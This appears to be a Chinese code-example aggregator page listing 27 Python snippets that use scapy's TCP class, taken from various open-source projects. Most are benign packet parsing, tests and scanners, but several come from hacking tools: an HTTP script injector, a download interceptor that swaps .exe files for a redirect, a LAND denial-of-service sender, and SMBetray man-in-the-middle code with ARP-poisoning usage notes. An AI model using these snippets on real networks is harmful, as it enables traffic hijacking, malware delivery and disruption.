@@ -1,0 +1,702 @@
+示例1: get_syn_and_ack_numbers
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def get_syn_and_ack_numbers(request):
+    global src_ip_address
+    global response_sequence_number
+    global response_acknowledgement_number
+    global response_timestamp
+    global response_payload_len
+
+    if request.haslayer(TCP):
+        response_sequence_number = request[TCP].seq
+        response_acknowledgement_number = request[TCP].ack
+        response_timestamp = request[TCP].time
+        response_payload_len += len(request[TCP].payload)
+
+        print(Base.c_success + "Response seq: " + str(response_sequence_number) + " ack: " + \)
+              str(response_acknowledgement_number) + " timestamp: " + str(response_timestamp) + " len: " + \
+              str(len(request[TCP].payload)) 
+开发者ID:raw-packet，项目名称:raw-packet，代码行数:18，代码来源:send_tcp_packets.py
+
+
+
+ 
+示例2: test_single_tcp_packet
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def test_single_tcp_packet():
+
+    packets = [
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=80, dport=5355)
+    ]
+
+    events = list(packets_to_datasource_events(packets).events())
+    assert len(events) == 1
+
+    assert events[0]["src_mac"] == "ab:ab:ab:ab:ab:ab"
+    assert events[0]["dst_mac"] == "12:12:12:12:12:12"
+    assert events[0]["src_ip"] == "127.0.0.1"
+    assert events[0]["dst_ip"] == "192.168.1.1"
+    assert events[0]["sport"] == 80
+    assert events[0]["dport"] == 5355
+    assert events[0]["event_type"] == "TCP" 
+开发者ID:yampelo，项目名称:beagle，代码行数:20，代码来源:test_pcap.py
+
+
+示例3: test_single_http_packet
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def test_single_http_packet():
+
+    packets = [
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=12345, dport=80)
+        / HTTP()
+        / HTTPRequest(Method="GET", Path="/foo", Host="https://google.com")
+    ]
+
+    events = list(packets_to_datasource_events(packets).events())
+    assert len(events) == 1
+
+    assert events[0]["src_mac"] == "ab:ab:ab:ab:ab:ab"
+    assert events[0]["dst_mac"] == "12:12:12:12:12:12"
+    assert events[0]["src_ip"] == "127.0.0.1"
+    assert events[0]["dst_ip"] == "192.168.1.1"
+    assert events[0]["sport"] == 12345
+    assert events[0]["dport"] == 80
+    assert events[0]["http_method"] == "GET"
+    assert events[0]["uri"] == "/foo"
+    assert events[0]["http_dest"] == "https://google.com"
+
+    assert events[0]["event_type"] == "HTTPRequest" 
+开发者ID:yampelo，项目名称:beagle，代码行数:26，代码来源:test_pcap.py
+
+
+
+ 
+示例4: test_multiple_packets
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def test_multiple_packets():
+    packets = [
+        # HTTP Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=12345, dport=80)
+        / HTTP()
+        / HTTPRequest(Method="GET", Path="/foo", Host="https://google.com"),
+        # DNS Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / UDP(sport=80, dport=53)
+        / DNS(rd=1, qd=DNSQR(qtype="A", qname="google.com"), an=DNSRR(rdata="123.0.0.1")),
+        # TCP Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=80, dport=5355),
+    ]
+
+    events = list(packets_to_datasource_events(packets).events())
+    assert len(events) == 3
+
+    assert [e["event_type"] for e in events] == ["HTTPRequest", "DNS", "TCP"] 
+开发者ID:yampelo，项目名称:beagle，代码行数:25，代码来源:test_pcap.py
+
+
+示例5: __init__
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def __init__(self, client_ip = "", server_ip = "", client_port = 0, server_port = 0, protocol = "TCP", interface = ""):
+        self.client_ip 		= client_ip
+        self.server_ip 		= server_ip
+        self.client_port 	= client_port
+        self.server_port 	= server_port
+        self.protocol 		= protocol.lower()
+        self.interface 		= interface
+
+    # This returns just the source address & port in a string format
+    # so that it can be hashed and tied back to the connectionManager.
+    # The protocol, source address, and port are the only shared pieces of information
+    # that both the MiTMModule socket and nfqueue intercept have access to, so
+    # nfqueue hashes this info together and uses that hash as the key in the 
+    # connectionMnaager. Once the MiTMModule recieves the intercepted connection,
+    # it will hash the proto/source ip/port to pull back the whole Connection
+    # object from the connectionManager - and thus - have the destination ip and port
+    # to then behave like a fully transparent TCP/UDP MiTM server. 
+开发者ID:quickbreach，项目名称:SMBetray，代码行数:19，代码来源:ebcLib.py
+
+
+
+ 
+示例6: _process_syn_scan
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def _process_syn_scan(self, pkt):
+        """
+        Receives SYN scan response from devices.
+
+        """
+        src_mac = pkt[sc.Ether].src
+        device_id = utils.get_device_id(src_mac, self._host_state)
+        device_port = pkt[sc.TCP].sport
+
+        with self._host_state.lock:
+            port_list = self._host_state.pending_syn_scan_dict.setdefault(device_id, [])
+            if device_port not in port_list:
+                port_list.append(device_port)
+                utils.log('[SYN Scan Debug] Device {} ({}): Port {}'.format(
+                    pkt[sc.IP].src, device_id, device_port
+                )) 
+开发者ID:noise-lab，项目名称:iot-inspector-client，代码行数:18，代码来源:packet_processor.py
+
+
+示例7: _process_http_host
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def _process_http_host(self, pkt, device_id, remote_ip):
+
+        try:
+            http_host = pkt[http.HTTPRequest].fields['Host'].decode('utf-8')
+        except Exception as e:
+            return
+        
+        device_port = pkt[sc.TCP].sport
+
+        with self._host_state.lock:
+            self._host_state \
+                .pending_dns_dict \
+                .setdefault(
+                    (device_id, http_host, 'http-host', device_port), set()) \
+                .add(remote_ip)
+
+        utils.log('[UPLOAD] HTTP host:', http_host) 
+开发者ID:noise-lab，项目名称:iot-inspector-client，代码行数:19，代码来源:packet_processor.py
+
+
+示例8: inject_code
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def inject_code(packet):
+    http_packet = scapy.IP(packet.get_payload())
+    if http_packet.haslayer(scapy.Raw):
+        load = http_packet[scapy.Raw].load
+        if http_packet[scapy.TCP].dport == 10000:
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            load = load.replace("HTTP/1.1", "HTTP/1.0")
+        elif http_packet[scapy.TCP].sport == 10000:
+            injection_code = """<script>alert('Hello from devopslife.xyz');
+                                </script>"""
+            load = load.replace("</body>", injection_code + "</body>")
+            length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if length_search and "text/html" in load:
+                length = length_search.group(1)
+                new_length = int(length) + len(injection_code)
+                load = load.replace(length, str(new_length))
+
+        if load != http_packet[scapy.Raw].load:
+            new_packet = change_payload(http_packet, load)
+            packet.set_payload(str(new_packet))
+    packet.accept() 
+开发者ID:mpostument，项目名称:hacking_tools，代码行数:23，代码来源:code_injector.py
+
+
+示例9: replace_file
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def replace_file(packet):
+    options = get_arguments()
+    parsed_url = urlparse(options.url)
+    http_packet = scapy.IP(packet.get_payload())
+    if http_packet.haslayer(scapy.Raw):
+        if http_packet[scapy.TCP].dport == 10000:
+            if ".exe" in http_packet[scapy.Raw].load and \
+               parsed_url.netloc not in http_packet[scapy.Raw].load:
+                print("[+] exe requested")
+                ack_list.append(http_packet[scapy.TCP].ack)
+        elif http_packet[scapy.TCP].sport == 10000:
+            if http_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(http_packet[scapy.TCP].seq)
+                print("Replacing file")
+                hacked_packet = change_payload(http_packet, options.url)
+                packet.set_payload(str(hacked_packet))
+    packet.accept() 
+开发者ID:mpostument，项目名称:hacking_tools，代码行数:19，代码来源:file_interceptor.py
+
+
+示例10: sr1_file
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def sr1_file(test_params, test_filename, display_packet=False):
+    """Read test message from given file, sends this message to server and parses response."""
+    with open(test_filename, "rb") as file_handle:
+        test_packet = file_handle.read()
+    if display_packet:
+        # print("Protocol: {}".format(proto_mapping(test_params.protocol)))
+        try:
+            if test_params.protocol in PROTOCOL_TESTERS:
+                out_packet = PROTOCOL_TESTERS[test_params.protocol].request_parser(
+                    test_packet
+                )
+            out_packet.show()
+            print_verbose(test_params, 60 * "-")
+        except (TypeError, struct.error, RuntimeError, ValueError, Scapy_Exception):
+            pass
+    test_result = None
+    if test_params.protocol in [Protocol.SSDP]:
+        test_result = ssdp_send_query(test_params, test_packet)
+    elif test_params.protocol in protocols_using(UDP):
+        test_result = udp_sr1(test_params, test_packet)
+    elif test_params.protocol in protocols_using(TCP):
+        test_result = tcp_sr1(test_params, test_packet)
+    return test_result 
+开发者ID:Samsung，项目名称:cotopaxi，代码行数:25，代码来源:cotopaxi_tester.py
+
+
+示例11: proto_mapping_request
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def proto_mapping_request(protocol):
+    """Provide mapping of enum values to implementation classes."""
+    return {
+        Protocol.ALL: IP,
+        Protocol.UDP: UDP,
+        Protocol.TCP: TCP,
+        Protocol.CoAP: CoAP,
+        Protocol.mDNS: DNS,
+        Protocol.MQTT: MQTT,
+        Protocol.DTLS: DTLS,
+        Protocol.QUIC: UDP,
+        Protocol.RTSP: HTTPRequest,
+        Protocol.SSDP: HTTPRequest,
+        Protocol.HTCPCP: HTTPRequest,
+        Protocol.HTTP: HTTPRequest,
+    }[protocol] 
+开发者ID:Samsung，项目名称:cotopaxi，代码行数:18，代码来源:common_utils.py
+
+
+示例12: visit_packet
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def visit_packet(self, time, packet):
+        if (IP not in packet and IPv6 not in packet) or TCP not in packet:
+            return
+
+        iph = packet[IP] if IP in packet else packet[IPv6]
+        tcph = packet[TCP]
+
+        if iph.src == self._rcv_ip:
+            return
+
+        port = tcph.sport
+        if port not in self._packet_size:
+            return
+
+        # TODO(arjunroy) IPv4 = total len, IPv6 = payload len. Is it important?
+        packet_len = packet.len if IP in packet else packet.plen
+        sizes = self._packet_size[port]
+        if packet_len in sizes:
+            sizes[packet_len] += 1
+        else:
+            sizes[packet_len] = 1 
+开发者ID:google，项目名称:transperf，代码行数:23，代码来源:metric.py
+
+
+示例13: pkt_callback
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def pkt_callback(self, pkt):
+        """
+        Proccess HTTP packets (direct)
+        """
+        if pkt[IP].id >= 200 and pkt[IP].id < 300:
+            self.pktlen = pkt[IP].id - 200
+        elif pkt[IP].id >= 300 and pkt[IP].id < 400:
+            self.pkttotal = pkt[IP].id - 300
+        elif pkt[IP].id >= 500 and pkt[IP].id < 600:
+            self.dic[pkt[IP].id - 500] = '{:04x}'.format(pkt[TCP].window)
+        elif pkt[IP].id == 666:
+            print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime())
+                  + 'HTTP:' + pkt[IP].src + ':ALARM Case Open!')
+
+        if len(self.dic) == self.pkttotal:
+            odic = collections.OrderedDict(sorted(self.dic.items()))
+            final = ''
+            for value in odic.iteritems():
+                final = final + value[1]
+            text = decrypt(final[:self.pktlen])
+            text = text.strip()
+            hexip = text.split(',')[-1]
+            text = text.replace(hexip, hextoip(hexip))
+            text = 'HTTP:' + pkt[IP].src + ':' + text
+            printer(self.filed, text)
+            self.dic = {}
+            self.pkttotal = 200 
+开发者ID:ekiojp，项目名称:circo，代码行数:29，代码来源:carpa.py
+
+
+示例14: launch
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def launch(self):
+        send(IP(src=self.get_value("target"), dst=self.get_value("target"))/TCP(sport=self.get_value("port"), dport=self.get_value("port")), count=self.get_value("size")) 
+开发者ID:ecthros，项目名称:pina-colada，代码行数:4，代码来源:land.py
+
+
+示例15: sniff
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def sniff(self, target=None, iface=None):
+        def _process(pkt):
+            match_ip = pkt.haslayer(IP) and (pkt[IP].src == target[0] or pkt[IP].dst == target[0]) if target else True
+            match_port = pkt.haslayer(TCP) and (
+                pkt[TCP].sport == target[1] or pkt[TCP].dport == target[1]) if len(target) == 2 else True
+            if match_ip and match_port:
+                self.capabilities.insert(pkt, client=False)
+                events = self.capabilities.get_events()         # misuse get_events :/
+                if events:
+                    strconn = {'src': None,
+                               'dst': None,
+                               'sport': None,
+                               'dport': None}
+
+                    if pkt.haslayer(IP):
+                        strconn['src'] = pkt[IP].src
+                        strconn['dst'] = pkt[IP].dst
+                    if pkt.haslayer(TCP):
+                        strconn['sport'] = pkt[TCP].sport
+                        strconn['dport'] = pkt[TCP].dport
+
+                    print ("Connection: %(src)s:%(sport)d <==> %(dst)s:%(dport)d" % strconn)
+                    print ("* EVENT - " + "\n* EVENT - ".join(e[0] for e in events))
+            return
+        if iface:
+            conf.iface = iface
+        while True:
+            bpf = None
+            if len(target):
+                bpf = "host %s" % target[0]
+            if len(target) == 2:
+                bpf += " and tcp port %d" % target[1]
+            sniff(filter=bpf,
+                  prn=_process,
+                  store=0,
+                  timeout=3) 
+开发者ID:tintinweb，项目名称:scapy-ssl_tls，代码行数:38，代码来源:security_scanner.py
+
+
+示例16: test_from_datasources
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def test_from_datasources():
+    packets_1 = [
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=12345, dport=80)
+        / HTTP()
+        / HTTPRequest(Method="GET", Path="/foo", Host="https://google.com")
+    ]
+
+    packets_2 = [
+        # HTTP Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=12345, dport=80)
+        / HTTP()
+        / HTTPRequest(Method="GET", Path="/foo", Host="https://google.com"),
+        # DNS Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / UDP(sport=80, dport=53)
+        / DNS(rd=1, qd=DNSQR(qtype="A", qname="google.com"), an=DNSRR(rdata="123.0.0.1")),
+        # TCP Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=80, dport=5355),
+    ]
+
+    nx = NetworkX.from_datasources(
+        [packets_to_datasource_events(packets) for packets in [packets_1, packets_2]]
+    )
+
+    # Make the graph
+    nx.graph()
+
+    assert not nx.is_empty() 
+开发者ID:yampelo，项目名称:beagle，代码行数:37，代码来源:test_networkx.py
+
+
+示例17: main
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def main():
+
+    if len(sys.argv)<3:
+        print 'pass 2 arguments: <destination> "<message>"'
+        exit(1)
+
+    addr = socket.gethostbyname(sys.argv[1])
+    iface = get_if()
+
+    print "sending on interface %s to %s" % (iface, str(addr))
+    pkt =  Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff')
+    pkt = pkt /IP(dst=addr) / TCP(dport=1234, sport=random.randint(49152,65535)) / sys.argv[2]
+    pkt.show2()
+    sendp(pkt, iface=iface, verbose=False) 
+开发者ID:nsg-ethz，项目名称:p4-utils，代码行数:16，代码来源:send.py
+
+
+示例18: __str__
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def __str__(self):
+        return "[" + str(self.protocol.upper()) + "] " + str(self.client_ip) + ":" + str(self.client_port) + " -> " + str(self.server_ip) + ":" + str(self.server_port)
+
+# MiTMServer - A fully modular and transparent UDP/TCP proxy server that leverages nfqueue and iptables to run mitm attacks
+#	Usage:
+#	0. Setup a bi-directional arp-cache poisoning attack with ip_forwarding enabled on your machine (Pro tip: run "sysctl net.ipv4.ip_forward=1")
+#	1. Declare an instance of a MiTMModule
+#	2. Declare an instance of a MiTMServer as 'MiTMServer(desired_port, either "TCP" or "UDP", MiTMModule_instance, T/F for newInstance)'
+#	3. MiTMServer.start() -- you can run multiple servers with different ports in multiple threads
+# 	4. Profit 
+开发者ID:quickbreach，项目名称:SMBetray，代码行数:12，代码来源:ebcLib.py
+
+
+示例19: nfqueueBinder
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def nfqueueBinder(self):
+        self.logger.debug("[ebcLib.py] Binding nfqueue...")
+        nfqueue = netfilterqueue.NetfilterQueue()
+        nfqueue.bind(self.nfqueueNum, self.nfqueueHandler)
+        nfqueue.run()
+
+    # This listens for new requests and handles them
+    # TCP - forks them off to their own threads
+    # UDP - directly calls the mitmInstance since it's a "stateless" protocol 
+开发者ID:quickbreach，项目名称:SMBetray，代码行数:11，代码来源:ebcLib.py
+
+
+示例20: listen
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def listen(self):
+        try:
+            # Open up the firewall
+            self.openFirewall()
+            # Start up nfqueue bind
+            self.nfqueueThread.daemon = True
+            self.nfqueueThread.start()
+            # Start up the TCP intercept server
+            if(self.protocol == "TCP"):
+                self.sock.listen(5)
+                self.logger.info("[ebcLib.py] Started " + self.protocol + "/" + str(self.port) + " intercept server")
+                while True:
+                    client, address = self.sock.accept()
+                    client.settimeout(60)
+                    self.myThreads.append(threading.Thread(target = self.victimHandler, args = (client, address)))
+                    self.myThreads[-1].daemon = True
+                    self.myThreads[-1].start()
+            '''
+            # TODO: Add UDP support
+            if(self.protocol == "UDP"):
+                self.logger.info("Starting " + self.protocol + "/" + str(self.port) + " intercept server...")
+                while True:
+                    data, address = self.sock.recvfrom()
+                    # Check if nfqueue was able to grab the important info
+                    nc = Connection(str(address[0]), '', int(address[1]), '', self.protocol, self.interface) 
+                    key = hash(str(nc.getMark()))
+                    if key not in self.connectionManager:
+                        self.logger.debug("Connection was not found in nfqueue populated dict")
+                        continue
+                    resp = self.mitmInstance.run_mitm(data)
+                    self.sock.sendto(resp, (address[0], address[1]))
+            '''	
+        except KeyboardInterrupt:
+            self.logger.debug("[ebcLib.py] Shutting down......")
+            self.shutdown()
+            return
+        self.shutdown()
+        return
+    
+    # This is the thread in which a hijacked TCP/UDP connection is
+    # handled in its own thread 
+开发者ID:quickbreach，项目名称:SMBetray，代码行数:43，代码来源:ebcLib.py
+
+
+示例21: _syn_scan_thread_helper
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def _syn_scan_thread_helper(self):
+
+        while True:
+
+            time.sleep(1)
+
+            if not self._host_state.is_inspecting():
+                continue
+
+            # Build a random list of (ip, port).
+            port_list = get_port_list()
+            ip_list = self._host_state.ip_mac_dict.keys()
+            ip_port_list = list(itertools.product(ip_list, port_list))
+            random.shuffle(ip_port_list)
+
+            if len(ip_list) == 0:
+                continue
+
+            utils.log('[SYN Scanning] Start scanning {} ports over IPs: {}'.format(
+                len(port_list),
+                ', '.join(ip_list)
+            ))
+
+            for (ip, port) in ip_port_list:
+
+                time.sleep(0.01)
+
+                syn_pkt = sc.IP(dst=ip) / \
+                    sc.TCP(dport=port, sport=SYN_SCAN_SOURCE_PORT, flags="S", seq=SYN_SCAN_SEQ_NUM)
+                sc.send(syn_pkt, verbose=0)
+
+                with self._lock:
+                    if not self._active:
+                        return 
+开发者ID:noise-lab，项目名称:iot-inspector-client，代码行数:36，代码来源:syn_scan.py
+
+
+示例22: get_client_cert
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def get_client_cert(pkt, layer):
+
+    layer_str = repr(layer)
+
+    pubkey = ''
+    signature = ''
+
+    match = re.search(r'( pubkey=<[^>]+>)', layer_str)
+    if match:
+        pubkey = hashlib.sha256(match.group(1)).hexdigest()
+
+    match = re.search(r'( signature=<[^>]+>)', layer_str)
+    if match:
+        signature = hashlib.sha256(match.group(1)).hexdigest()
+
+    return {
+        'type': 'client_cert',
+        'pubkey': pubkey,
+        'signature': signature,
+        'hash': hashlib.sha256(layer_str).hexdigest(),
+        'remote_ip': pkt[sc.IP].dst,
+        'remote_port': pkt[sc.TCP].dport,
+        'device_ip': pkt[sc.IP].src,
+        'device_port': pkt[sc.TCP].sport,
+        'client_ts': time.time()
+    } 
+开发者ID:noise-lab，项目名称:iot-inspector-client，代码行数:28，代码来源:packet_processor.py
+
+
+示例23: validate_flags
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def validate_flags(pkt, flags):
+    return flags in pkt['TCP'].flags 
+开发者ID:ArmisSecurity，项目名称:urgent11-detector，代码行数:4，代码来源:urgent11_detector.py
+
+
+示例24: validate_ports
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def validate_ports(pkt, src, dst):
+    return pkt['TCP'].sport == src and pkt['TCP'].dport == dst 
+开发者ID:ArmisSecurity，项目名称:urgent11-detector，代码行数:4，代码来源:urgent11_detector.py
+
+
+示例25: detect
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def detect(self, dst_port):
+        with get_safe_src_port() as src_port:
+            for _ in range(CFG_RETRANSMISSION_RATE):
+                # We start by adding normal TCP Options
+                tcp_options = [(TCP_OPTION_MSS, struct.pack('>H', 1460)),
+                               (TCP_OPTION_NOP, b''),
+                               # WNDSCL option with invalid length,
+                               # followed by a valid one:
+                               (TCP_OPTION_WNDSCL, b''),
+                               (TCP_OPTION_WNDSCL, b'\0')]
+
+                pkt = IP(dst=self._target) / TCP(sport=src_port,
+                                                 dport=dst_port,
+                                                 flags=TCP_SYN_FLAG,
+                                                 options=tcp_options)
+                response = sr1(pkt, verbose=False, timeout=CFG_PACKET_TIMEOUT)
+                if response is not None:
+                    break
+
+            if response is None:
+                self.vxworks_score = 0
+                self.ipnet_score = 50
+            elif (validate_flags(response, TCP_RST_FLAG) and
+                  validate_ports(response, dst_port, src_port)):
+                self.vxworks_score = 100
+                self.ipnet_score = 100
+            else:
+                self.vxworks_score = -100
+                self.ipnet_score = -100 
+开发者ID:ArmisSecurity，项目名称:urgent11-detector，代码行数:31，代码来源:urgent11_detector.py
+
+
+示例26: change_payload
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def change_payload(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet 
+开发者ID:mpostument，项目名称:hacking_tools，代码行数:8，代码来源:code_injector.py
+
+
+示例27: change_payload
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import TCP [as 别名]
+def change_payload(packet, url):
+    packet[scapy.Raw].load = """HTTP/1.1 301 Moved Permanently
+                             Location: {}\n""".format(url)
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet 
+开发者ID:mpostument，项目名称:hacking_tools，代码行数:9，代码来源:file_interceptor.py
